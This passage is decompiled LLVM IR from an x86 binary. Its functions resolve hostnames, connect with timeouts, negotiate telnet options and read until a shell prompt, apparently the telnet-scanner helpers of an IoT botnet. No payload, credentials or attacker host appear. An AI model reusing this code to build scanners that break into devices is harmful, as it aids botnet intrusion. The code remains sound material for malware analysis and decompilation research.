  %stack_var_-32.1 = phi i8* [ %v22_80493b4, %dec_label_pc_80493a8 ], [ %stack_var_-32.0, %dec_label_pc_80493c5 ]
  store i8 0, i8* %stack_var_-32.1, align 1
  br label %dec_label_pc_80493e2

dec_label_pc_80493e2:                             ; preds = %dec_label_pc_8049396, %dec_label_pc_80493d3
  %storemerge = phi i32 [ -1, %dec_label_pc_8049396 ], [ %stack_var_-28.0, %dec_label_pc_80493d3 ]
  %v2_80493ee = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80493ee, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_80493c5, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 1, 0, 2, 3 }
  uselistorder i8* %v22_80493b4, { 1, 0 }
  uselistorder i32 %v2_8049252, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80493e2, { 1, 0 }
  uselistorder label %dec_label_pc_80493d3, { 1, 0 }
  uselistorder label %dec_label_pc_80493c5, { 1, 0 }
  uselistorder label %dec_label_pc_804935b, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80492bb, { 1, 0 }
}

define i32 @hostname_to_ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80493f1 = load i32, i32* @ebp, align 4
  store i32 %v0_80493f1, i32* %stack_var_-4, align 4
  %v4_80493f1 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80493f1, i32* @ebp, align 4
  %v2_80493fd = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_8049405 = icmp eq i32 %v2_80493fd, 0
  %v1_8049409 = icmp eq i1 %v4_8049405, false
  br i1 %v1_8049409, label %dec_label_pc_8049420, label %dec_label_pc_804940b

dec_label_pc_804940b:                             ; preds = %entry
  %v3_8049412 = call i32 @__GI_herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_805929c.22, i32 0, i32 0))
  br label %dec_label_pc_8049473

dec_label_pc_8049420:                             ; preds = %entry
  %v1_8049423 = add i32 %v2_80493fd, 16
  %v2_8049423 = inttoptr i32 %v1_8049423 to i32*
  %v3_8049423 = load i32, i32* %v2_8049423, align 4
  %v1_8049439 = inttoptr i32 %v3_8049423 to i32*
  %v2_8049439 = load i32, i32* %v1_8049439, align 4
  %v1_804943b = icmp eq i32 %v2_8049439, 0
  br i1 %v1_804943b, label %dec_label_pc_8049473, label %dec_label_pc_804943f

dec_label_pc_804943f:                             ; preds = %dec_label_pc_8049420
  %v2_8049448 = load i32, i32* %v1_8049439, align 4
  %v1_804944a = inttoptr i32 %v2_8049448 to i32*
  %v2_804944a = load i32, i32* %v1_804944a, align 4
  %v2_804944f = call i32 @__GI_inet_ntoa(i32 %v2_804944a)
  store i32 %arg2, i32* @eax, align 4
  %v4_804945b = inttoptr i32 %arg2 to i8*
  %v4_804945e = call i32 @strcpy(i8* %v4_804945b, i32 %v2_804944f)
  br label %dec_label_pc_8049473

dec_label_pc_8049473:                             ; preds = %dec_label_pc_8049420, %dec_label_pc_804943f, %dec_label_pc_804940b
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_804943f ], [ 1, %dec_label_pc_804940b ], [ 1, %dec_label_pc_8049420 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8049473, { 1, 0, 2 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804947b = load i32, i32* @edi, align 4
  store i32 %v0_804947b, i32* %stack_var_-8, align 4
  %v3_8049498 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_80494a0 = or i32 %v3_8049498, 2048
  %v3_80494bc = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_80494a0)
  store i32 2, i32* %stack_var_-40, align 4
  %v1_80494d0 = trunc i32 %arg3 to i16
  %v2_80494d0 = call i32 @htons(i16 %v1_80494d0)
  store i32 %arg2, i32* @edx, align 4
  %v3_80494ec = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-36)
  %v1_80494f1 = icmp eq i32 %v3_80494ec, 0
  br i1 %v1_80494f1, label %dec_label_pc_8049504, label %dec_label_pc_8049674

dec_label_pc_8049504:                             ; preds = %entry
  %v2_80494df = ptrtoint i32* %stack_var_-40 to i32
  %v3_804952c = call i32 @__libc_connect(i32 %arg1, i32 %v2_80494df, i32 16)
  %v5_8049534 = icmp slt i32 %v3_804952c, 0
  %v1_8049538 = icmp eq i1 %v5_8049534, false
  br i1 %v1_8049538, label %dec_label_pc_804962b, label %dec_label_pc_804953e

dec_label_pc_804953e:                             ; preds = %dec_label_pc_8049504
  %v1_804953e = call i32 @__errno_location(i32 %v3_804952c)
  %v1_8049543 = inttoptr i32 %v1_804953e to i32*
  %v2_8049543 = load i32, i32* %v1_8049543, align 4
  %v9_8049545 = icmp eq i32 %v2_8049543, 115
  %v1_8049548 = icmp eq i1 %v9_8049545, false
  br i1 %v1_8049548, label %dec_label_pc_8049674, label %dec_label_pc_804954e

dec_label_pc_804954e:                             ; preds = %dec_label_pc_804953e
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_804956b = ptrtoint i32* %stack_var_-168 to i32
  %tmp27 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_804956b, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049572 = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v2_804957f = udiv i32 %arg1, 32
  %v1_8049585 = urem i32 %arg1, 32
  %v0_8049588 = load i32, i32* @ebp, align 4
  %v2_8049588 = mul nuw nsw i32 %v2_804957f, 4
  %v3_8049588 = add nsw i32 %v2_8049588, -164
  %v4_8049588 = add i32 %v3_8049588, %v0_8049588
  %v5_8049588 = inttoptr i32 %v4_8049588 to i32*
  %v6_8049588 = load i32, i32* %v5_8049588, align 4
  %v9_8049588 = shl i32 1, %v1_8049585
  %v12_8049588 = or i32 %v6_8049588, %v9_8049588
  store i32 %v12_8049588, i32* %v5_8049588, align 4
  %v1_8049593 = add i32 %arg1, 1
  %v2_8049594 = ptrtoint i32* %stack_var_-176 to i32
  %v5_80495bb = call i32 @__libc_select(i32 %v1_8049593, i32 0, i32 %v2_804956b, i32 0, i32 %v2_8049594)
  %tmp28 = icmp slt i32 %v5_80495bb, 1
  br i1 %tmp28, label %dec_label_pc_8049674, label %dec_label_pc_80495c4

dec_label_pc_80495c4:                             ; preds = %dec_label_pc_804954e
  store i32 4, i32* %stack_var_-180, align 4
  %v2_80495ce = ptrtoint i32* %stack_var_-180 to i32
  %v2_80495d8 = ptrtoint i32* %stack_var_-184 to i32
  %v5_80495f8 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_80495d8, i32 %v2_80495ce)
  %v3_80495fd = load i32, i32* %stack_var_-184, align 4
  %v1_8049603 = icmp eq i32 %v3_80495fd, 0
  br i1 %v1_8049603, label %dec_label_pc_804962b, label %dec_label_pc_8049674

dec_label_pc_804962b:                             ; preds = %dec_label_pc_80495c4, %dec_label_pc_8049504
  %v3_8049641 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_8049649 = and i32 %v3_8049641, -2049
  %v3_8049665 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_8049649)
  br label %dec_label_pc_8049674

dec_label_pc_8049674:                             ; preds = %dec_label_pc_804953e, %dec_label_pc_804954e, %dec_label_pc_80495c4, %entry, %dec_label_pc_804962b
  %stack_var_-188.0 = phi i32 [ 1, %dec_label_pc_804962b ], [ 0, %entry ], [ 0, %dec_label_pc_80495c4 ], [ 0, %dec_label_pc_804954e ], [ 0, %dec_label_pc_804953e ]
  %v2_8049680 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049680, i32* @edi, align 4
  ret i32 %stack_var_-188.0

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8049674, { 4, 2, 1, 0, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8049686 = load i32, i32* @ebx, align 4
  store i32 %v0_8049686, i32* %stack_var_-8, align 4
  %v1_804968a = call i32 @__libc_fork(i32 %v0_8049686)
  %v4_8049692 = icmp eq i32 %v1_804968a, 0
  %v1_8049696 = icmp eq i1 %v4_8049692, false
  br i1 %v1_8049696, label %dec_label_pc_80496a3, label %dec_label_pc_8049698

dec_label_pc_8049698:                             ; preds = %entry
  br label %dec_label_pc_804977f

dec_label_pc_80496a3:                             ; preds = %entry
  %v0_80496a3 = load i32, i32* @global_var_805f4e8.23, align 8
  %v0_80496a8 = load i32, i32* @global_var_805f4ec.24, align 4
  %v1_80496ae = add i32 %v0_80496a3, 1
  %v5_80496ae = icmp eq i32 %v0_80496a3, -1
  %v2_80496b1 = zext i1 %v5_80496ae to i32
  %v3_80496b1 = add i32 %v2_80496b1, %v0_80496a8
  store i32 %v1_80496ae, i32* @global_var_805f4e8.23, align 8
  store i32 %v3_80496b1, i32* @global_var_805f4ec.24, align 4
  %v2_80496ce = mul i32 %v1_80496ae, 4
  %v1_80496d1 = add i32 %v2_80496ce, 4
  %v1_80496d7 = call i32 @malloc(i32 %v1_80496d1)
  br label %dec_label_pc_804970a

dec_label_pc_80496e8:                             ; preds = %dec_label_pc_804970a, %dec_label_pc_804973b
  %v2_80496eb = mul i32 %storemerge1, 4
  %v5_80496f0 = add i32 %v2_80496eb, %v1_80496d7
  %v0_80496fb = load i32, i32* @global_var_8065774.25, align 4
  %v2_8049700 = add i32 %v0_80496fb, %v2_80496eb
  %v1_8049703 = inttoptr i32 %v2_8049700 to i32*
  %v2_8049703 = load i32, i32* %v1_8049703, align 4
  %v2_8049705 = inttoptr i32 %v5_80496f0 to i32*
  store i32 %v2_8049703, i32* %v2_8049705, align 4
  %v4_8049707 = add i32 %storemerge1, 1
  br label %dec_label_pc_804970a

dec_label_pc_804970a:                             ; preds = %dec_label_pc_80496a3, %dec_label_pc_80496e8
  %storemerge1 = phi i32 [ %v4_8049707, %dec_label_pc_80496e8 ], [ 0, %dec_label_pc_80496a3 ]
  %v0_8049718 = load i32, i32* @global_var_805f4e8.23, align 8
  %v0_804971d = load i32, i32* @global_var_805f4ec.24, align 4
  %v4_8049727 = icmp ne i32 %v0_8049718, 0
  %v2_804972a = zext i1 %v4_8049727 to i32
  %v3_804972a = add i32 %v0_804971d, -1
  %v4_804972a = add i32 %v3_804972a, %v2_804972a
  store i32 %v4_804972a, i32* @ebx, align 4
  %v10_8049736 = icmp eq i32 %v4_804972a, 0
  br i1 %v10_8049736, label %dec_label_pc_804973b, label %dec_label_pc_80496e8

dec_label_pc_804973b:                             ; preds = %dec_label_pc_804970a
  %v1_8049727 = add i32 %v0_8049718, -1
  %v10_8049746 = icmp ult i32 %storemerge1, %v1_8049727
  br i1 %v10_8049746, label %dec_label_pc_80496e8, label %dec_label_pc_804974b

dec_label_pc_804974b:                             ; preds = %dec_label_pc_804973b
  %v2_8049756 = mul i32 %v0_8049718, 4
  %v5_8049759 = add i32 %v2_8049756, %v1_80496d7
  %v1_804975c = add i32 %v5_8049759, -4
  store i32 %v1_804975c, i32* @edx, align 4
  %v2_8049762 = inttoptr i32 %v1_804975c to i32*
  store i32 %v1_804968a, i32* %v2_8049762, align 4
  %v0_8049764 = load i32, i32* @global_var_8065774.25, align 4
  %v1_804976c = call i32 @free(i32 %v0_8049764)
  store i32 %v1_80496d7, i32* @global_var_8065774.25, align 4
  store i32 %v1_804968a, i32* @ecx, align 4
  br label %dec_label_pc_804977f

dec_label_pc_804977f:                             ; preds = %dec_label_pc_8049698, %dec_label_pc_804974b
  %v2_8049785 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049785, i32* @ebx, align 4
  ret i32 %v1_804968a

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_80496eb, { 1, 0 }
  uselistorder i32 %v1_80496d7, { 2, 0, 1 }
  uselistorder i32 %v0_80496a3, { 1, 0 }
  uselistorder label %dec_label_pc_804977f, { 1, 0 }
  uselistorder label %dec_label_pc_804970a, { 1, 0 }
  uselistorder label %dec_label_pc_80496e8, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i8, align 1
  %stack_var_-4 = alloca i32, align 4
  %v0_8049788 = load i32, i32* @ebp, align 4
  store i32 %v0_8049788, i32* %stack_var_-4, align 4
  %v1_8049791 = add i32 %arg2, 1
  %v1_8049792 = inttoptr i32 %v1_8049791 to i8*
  %v2_8049792 = load i8, i8* %v1_8049792, align 1
  %v9_804979b = icmp ult i8 %v2_8049792, -5
  br i1 %v9_804979b, label %dec_label_pc_80498a6, label %dec_label_pc_80497a8

dec_label_pc_80497a8:                             ; preds = %entry
  %v7_80497af = icmp eq i8 %v2_8049792, -1
  br i1 %v7_80497af, label %dec_label_pc_80497b1, label %dec_label_pc_80497cb

dec_label_pc_80497b1:                             ; preds = %dec_label_pc_80497a8
  br label %dec_label_pc_80498a6

dec_label_pc_80497cb:                             ; preds = %dec_label_pc_80497a8
  store i8 -1, i8* %stack_var_-5, align 1
  %v2_80497df = ptrtoint i8* %stack_var_-5 to i32
  %v4_80497ec = call i32 @__libc_send(i32 %arg1, i32 %v2_80497df, i32 1, i32 16384)
  %v2_80497f5 = load i8, i8* %v1_8049792, align 1
  %v11_80497f8 = icmp eq i8 %v2_80497f5, -4
  %v1_80497fa = icmp eq i1 %v11_80497f8, false
  br i1 %v1_80497fa, label %dec_label_pc_8049802, label %dec_label_pc_80497fc

dec_label_pc_80497fc:                             ; preds = %dec_label_pc_80497cb
  store i8 -2, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049858

dec_label_pc_8049802:                             ; preds = %dec_label_pc_80497cb
  %v2_8049806 = load i8, i8* %v1_8049792, align 1
  %v11_8049809 = icmp eq i8 %v2_8049806, -2
  %v1_804980b = icmp eq i1 %v11_8049809, false
  br i1 %v1_804980b, label %dec_label_pc_8049813, label %dec_label_pc_804980d

dec_label_pc_804980d:                             ; preds = %dec_label_pc_8049802
  store i8 -4, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049858

dec_label_pc_8049813:                             ; preds = %dec_label_pc_8049802
  %v2_8049817 = load i8, i8* %v1_8049792, align 1
  %v10_804981a = icmp eq i8 %v2_8049817, 3
  %v1_804981c = icmp eq i1 %v10_804981a, false
  %v11_8049843 = icmp eq i8 %v2_8049817, -3
  %v1_8049845 = icmp eq i1 %v11_8049843, false
  br i1 %v1_804981c, label %dec_label_pc_804983c, label %dec_label_pc_804981e

dec_label_pc_804981e:                             ; preds = %dec_label_pc_8049813
  %. = select i1 %v1_8049845, i8 -3, i8 -5
  store i8 %., i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049858

dec_label_pc_804983c:                             ; preds = %dec_label_pc_8049813
  %.3 = select i1 %v1_8049845, i8 -2, i8 -4
  store i8 %.3, i8* %stack_var_-5, align 1
  br label %dec_label_pc_8049858

dec_label_pc_8049858:                             ; preds = %dec_label_pc_804981e, %dec_label_pc_804980d, %dec_label_pc_80497fc, %dec_label_pc_804983c
  %v4_8049875 = call i32 @__libc_send(i32 %arg1, i32 %v2_80497df, i32 1, i32 16384)
  %v1_804987d = add i32 %arg2, 2
  %v4_804989a = call i32 @__libc_send(i32 %arg1, i32 %v1_804987d, i32 1, i32 16384)
  %v2_80498a9.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_80498a6

dec_label_pc_80498a6:                             ; preds = %dec_label_pc_80497b1, %dec_label_pc_8049858, %entry
  %v2_80498a9 = phi i32 [ %v0_8049788, %dec_label_pc_80497b1 ], [ %v2_80498a9.pre, %dec_label_pc_8049858 ], [ %v0_8049788, %entry ]
  store i32 %v2_80498a9, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-5, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8 -3, { 1, 0 }
  uselistorder i8 -4, { 1, 2, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80498a6, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049858, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %v4_80498b9 = ptrtoint i8* %arg1 to i32
  %v3_80498ca = call i32 @_strlen(i8* %arg1)
  %v4_80498ca = mul i32 %v3_80498ca, -1
  %v1_80498d0 = sub i32 0, %v4_80498ca
  %v6_80498f7 = sub i32 %v4_80498b9, %v4_80498ca
  br label %dec_label_pc_804997f

dec_label_pc_80498e7:                             ; preds = %dec_label_pc_804993a, %dec_label_pc_8049922, %dec_label_pc_804990a, %dec_label_pc_80498f2
  %v4_80498e7 = add nsw i32 %stack_var_-12.031, 1
  %v7_80498f0 = icmp slt i32 %v4_80498e7, %v1_80498d0
  br i1 %v7_80498f0, label %dec_label_pc_80498f2, label %dec_label_pc_80498ea.dec_label_pc_8049952_crit_edge

dec_label_pc_80498ea.dec_label_pc_8049952_crit_edge: ; preds = %dec_label_pc_80498e7, %dec_label_pc_80498ea.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_80498ea.preheader ], [ %v4_80498e7, %dec_label_pc_80498e7 ]
  %.pre = sub i32 %v6_80498f7, %stack_var_-12.0.lcssa
  %.pre8 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8049952

dec_label_pc_80498f2:                             ; preds = %dec_label_pc_80498ea.preheader, %dec_label_pc_80498e7
  %stack_var_-12.031 = phi i32 [ %v4_80498e7, %dec_label_pc_80498e7 ], [ %stack_var_-12.1, %dec_label_pc_80498ea.preheader ]
  %v2_80498ff = sub i32 %v6_80498f7, %stack_var_-12.031
  %v1_8049903 = inttoptr i32 %v2_80498ff to i8*
  %v2_8049903 = load i8, i8* %v1_8049903, align 1
  %v4_8049906 = icmp eq i8 %v2_8049903, 0
  br i1 %v4_8049906, label %dec_label_pc_80498e7, label %dec_label_pc_804990a

dec_label_pc_804990a:                             ; preds = %dec_label_pc_80498f2
  %v2_804991b = load i8, i8* %v1_8049903, align 1
  %v7_804991e = icmp eq i8 %v2_804991b, 32
  br i1 %v7_804991e, label %dec_label_pc_80498e7, label %dec_label_pc_8049922

dec_label_pc_8049922:                             ; preds = %dec_label_pc_804990a
  %v2_8049933 = load i8, i8* %v1_8049903, align 1
  %v10_8049936 = icmp eq i8 %v2_8049933, 13
  br i1 %v10_8049936, label %dec_label_pc_80498e7, label %dec_label_pc_804993a

dec_label_pc_804993a:                             ; preds = %dec_label_pc_8049922
  %v2_804994b = load i8, i8* %v1_8049903, align 1
  %v10_804994e = icmp eq i8 %v2_804994b, 10
  br i1 %v10_804994e, label %dec_label_pc_80498e7, label %dec_label_pc_8049952

dec_label_pc_8049952:                             ; preds = %dec_label_pc_804993a, %dec_label_pc_80498ea.dec_label_pc_8049952_crit_edge
  %stack_var_-12.021 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_80498ea.dec_label_pc_8049952_crit_edge ], [ %stack_var_-12.031, %dec_label_pc_804993a ]
  %v1_8049963.pre-phi = phi i8* [ %.pre8, %dec_label_pc_80498ea.dec_label_pc_8049952_crit_edge ], [ %v1_8049903, %dec_label_pc_804993a ]
  %v2_8049963 = load i8, i8* %v1_8049963.pre-phi, align 1
  %v6_8049969 = add i32 %storemerge1, ptrtoint ([6 x i8]* @global_var_80592aa.26 to i32)
  %v1_804996c = inttoptr i32 %v6_8049969 to i8*
  %v2_804996c = load i8, i8* %v1_804996c, align 1
  %v15_804996f = icmp eq i8 %v2_8049963, %v2_804996c
  %v1_8049971 = icmp eq i1 %v15_804996f, false
  br i1 %v1_8049971, label %dec_label_pc_804997c, label %dec_label_pc_80499a9

dec_label_pc_804997c:                             ; preds = %dec_label_pc_8049952
  %v4_804997c = add i32 %storemerge1, 1
  br label %dec_label_pc_804997f

dec_label_pc_804997f:                             ; preds = %entry, %dec_label_pc_804997c
  %stack_var_-12.1 = phi i32 [ 0, %entry ], [ %stack_var_-12.021, %dec_label_pc_804997c ]
  %storemerge1 = phi i32 [ 0, %entry ], [ %v4_804997c, %dec_label_pc_804997c ]
  %v3_8049993 = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80592aa.26, i32 0, i32 0))
  %v7_804999a = icmp ult i32 %storemerge1, %v3_8049993
  br i1 %v7_804999a, label %dec_label_pc_80498ea.preheader, label %dec_label_pc_80499a9

dec_label_pc_80498ea.preheader:                   ; preds = %dec_label_pc_804997f
  %v7_80498f030 = icmp slt i32 %stack_var_-12.1, %v1_80498d0
  br i1 %v7_80498f030, label %dec_label_pc_80498f2, label %dec_label_pc_80498ea.dec_label_pc_8049952_crit_edge

dec_label_pc_80499a9:                             ; preds = %dec_label_pc_804997f, %dec_label_pc_8049952
  %storemerge = phi i32 [ 1, %dec_label_pc_8049952 ], [ 0, %dec_label_pc_804997f ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_80498f7, { 1, 0 }
  uselistorder [6 x i8]* @global_var_80592aa.26, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804997f, { 1, 0 }
  uselistorder label %dec_label_pc_80498ea.dec_label_pc_8049952_crit_edge, { 1, 0 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i8* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-168, align 4
  %v2_80499f8 = ptrtoint i32* %stack_var_-160 to i32
  %tmp28 = bitcast i32* %stack_var_-160 to i8*
  %v1_8049a12 = urem i32 %arg1, 32
  %v9_8049a15 = shl i32 1, %v1_8049a12
  %v1_8049a20 = add i32 %arg1, 1
  %v2_8049a21 = ptrtoint i32* %stack_var_-168 to i32
  %v5_8049a58 = ptrtoint i8* %arg6 to i32
  %v2_8049b2c = inttoptr i32 %arg2 to i8*
  %v4_8049b35 = icmp eq i32 %arg3, 0
  %v1_8049b5635 = add i32 %arg8, 2
  %v5_8049b5c44 = icmp slt i32 %v1_8049b5635, %arg7
  br i1 %v5_8049b5c44, label %dec_label_pc_8049b5e.lr.ph, label %dec_label_pc_8049b7a

dec_label_pc_8049b5e.lr.ph:                       ; preds = %entry
  %v2_8049a0c = udiv i32 %arg1, 32
  %v2_8049a15 = mul nuw nsw i32 %v2_8049a0c, 4
  %v3_8049a15 = add nsw i32 %v2_8049a15, -156
  %tmp32 = icmp slt i32 %arg5, 1
  %tmp33 = icmp eq i1 %tmp32, false
  br label %dec_label_pc_8049b5e

dec_label_pc_80499ee:                             ; preds = %dec_label_pc_8049b6c, %dec_label_pc_8049b5e
  store i32 %v2_80499f8, i32* @edi, align 4
  %v5_80499ff = call i8* @_memset(i8* %tmp28, i32 0, i32 32)
  %v0_8049a15 = load i32, i32* @ebp, align 4
  %v4_8049a15 = add i32 %v3_8049a15, %v0_8049a15
  %v5_8049a15 = inttoptr i32 %v4_8049a15 to i32*
  %v6_8049a15 = load i32, i32* %v5_8049a15, align 4
  %v12_8049a15 = or i32 %v6_8049a15, %v9_8049a15
  store i32 %v12_8049a15, i32* %v5_8049a15, align 4
  %v5_8049a48 = call i32 @__libc_select(i32 %v1_8049a20, i32 %v2_80499f8, i32 0, i32 0, i32 %v2_8049a21)
  %tmp29 = icmp slt i32 %v5_8049a48, 1
  br i1 %tmp29, label %dec_label_pc_8049b7a, label %dec_label_pc_8049a55

dec_label_pc_8049a55:                             ; preds = %dec_label_pc_80499ee
  %v6_8049a58 = add i32 %stack_var_-32.045, %v5_8049a58
  %v5_8049a5b = inttoptr i32 %v6_8049a58 to i8*
  %v4_8049a7b = call i32 @__libc_recv(i32 %arg1, i32 %v6_8049a58, i32 1, i32 0)
  %v13_8049a83 = icmp eq i32 %v4_8049a7b, -1
  br i1 %v13_8049a83, label %dec_label_pc_8049b96, label %dec_label_pc_8049a89

dec_label_pc_8049a89:                             ; preds = %dec_label_pc_8049a55
  %v4_8049a89 = icmp eq i32 %v4_8049a7b, 0
  %v1_8049a8d = icmp eq i1 %v4_8049a89, false
  br i1 %v1_8049a8d, label %dec_label_pc_8049a9e, label %dec_label_pc_8049b96

dec_label_pc_8049a9e:                             ; preds = %dec_label_pc_8049a89
  %v5_8049aa1 = add i32 %v4_8049a7b, %stack_var_-32.045
  %v2_8049aa7 = load i8, i8* %v5_8049a5b, align 1
  %v11_8049aaa = icmp eq i8 %v2_8049aa7, -1
  %v1_8049aac = icmp eq i1 %v11_8049aaa, false
  br i1 %v1_8049aac, label %dec_label_pc_8049b1f, label %dec_label_pc_8049aae

dec_label_pc_8049aae:                             ; preds = %dec_label_pc_8049a9e
  %v1_8049ab1 = add i32 %v6_8049a58, 1
  %v4_8049acc = call i32 @__libc_recv(i32 %arg1, i32 %v1_8049ab1, i32 2, i32 0)
  %v13_8049ad4 = icmp eq i32 %v4_8049acc, -1
  br i1 %v13_8049ad4, label %dec_label_pc_8049b96, label %dec_label_pc_8049ada

dec_label_pc_8049ada:                             ; preds = %dec_label_pc_8049aae
  %v4_8049ada = icmp eq i32 %v4_8049acc, 0
  %v1_8049ade = icmp eq i1 %v4_8049ada, false
  br i1 %v1_8049ade, label %dec_label_pc_8049aef, label %dec_label_pc_8049b96

dec_label_pc_8049aef:                             ; preds = %dec_label_pc_8049ada
  %v5_8049af2 = add i32 %v4_8049acc, %v5_8049aa1
  %v3_8049b0a = call i32 @negotiate(i32 %arg1, i32 %v6_8049a58, i32 3)
  %v1_8049b0f = icmp eq i32 %v3_8049b0a, 0
  %v1_8049b11 = icmp eq i1 %v1_8049b0f, false
  br i1 %v1_8049b11, label %dec_label_pc_8049b53.backedge, label %dec_label_pc_8049b96

dec_label_pc_8049b53.backedge:                    ; preds = %dec_label_pc_8049aef, %dec_label_pc_8049b35, %dec_label_pc_8049b3b
  %stack_var_-32.0.be = phi i32 [ %v5_8049aa1, %dec_label_pc_8049b35 ], [ %v5_8049aa1, %dec_label_pc_8049b3b ], [ %v5_8049af2, %dec_label_pc_8049aef ]
  %v1_8049b56 = add i32 %stack_var_-32.0.be, 2
  %v5_8049b5c = icmp slt i32 %v1_8049b56, %arg7
  br i1 %v5_8049b5c, label %dec_label_pc_8049b53.backedge.dec_label_pc_8049b5e_crit_edge, label %dec_label_pc_8049b7a

dec_label_pc_8049b53.backedge.dec_label_pc_8049b5e_crit_edge: ; preds = %dec_label_pc_8049b53.backedge
  %v3_8049b5e.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_8049b5e

dec_label_pc_8049b1f:                             ; preds = %dec_label_pc_8049a9e
  %v3_8049b2c = call i32 @strstr(i32 %v5_8049a58, i8* %v2_8049b2c)
  %v1_8049b31 = icmp eq i32 %v3_8049b2c, 0
  %v1_8049b33 = icmp eq i1 %v1_8049b31, false
  br i1 %v1_8049b33, label %dec_label_pc_8049b7a, label %dec_label_pc_8049b35

dec_label_pc_8049b35:                             ; preds = %dec_label_pc_8049b1f
  br i1 %v4_8049b35, label %dec_label_pc_8049b53.backedge, label %dec_label_pc_8049b3b

dec_label_pc_8049b3b:                             ; preds = %dec_label_pc_8049b35
  %v2_8049b41 = call i32 @matchPrompt(i8* %arg6)
  %v1_8049b46 = icmp eq i32 %v2_8049b41, 0
  br i1 %v1_8049b46, label %dec_label_pc_8049b53.backedge, label %dec_label_pc_8049b7a

dec_label_pc_8049b5e:                             ; preds = %dec_label_pc_8049b53.backedge.dec_label_pc_8049b5e_crit_edge, %dec_label_pc_8049b5e.lr.ph
  %v3_8049b5e = phi i32 [ %arg4, %dec_label_pc_8049b5e.lr.ph ], [ %v3_8049b5e.pre, %dec_label_pc_8049b53.backedge.dec_label_pc_8049b5e_crit_edge ]
  %stack_var_-32.045 = phi i32 [ %arg8, %dec_label_pc_8049b5e.lr.ph ], [ %stack_var_-32.0.be, %dec_label_pc_8049b53.backedge.dec_label_pc_8049b5e_crit_edge ]
  %tmp30 = icmp slt i32 %v3_8049b5e, 1
  %tmp31 = icmp eq i1 %tmp30, false
  br i1 %tmp31, label %dec_label_pc_80499ee, label %dec_label_pc_8049b6c

dec_label_pc_8049b6c:                             ; preds = %dec_label_pc_8049b5e
  br i1 %tmp33, label %dec_label_pc_80499ee, label %dec_label_pc_8049b7a

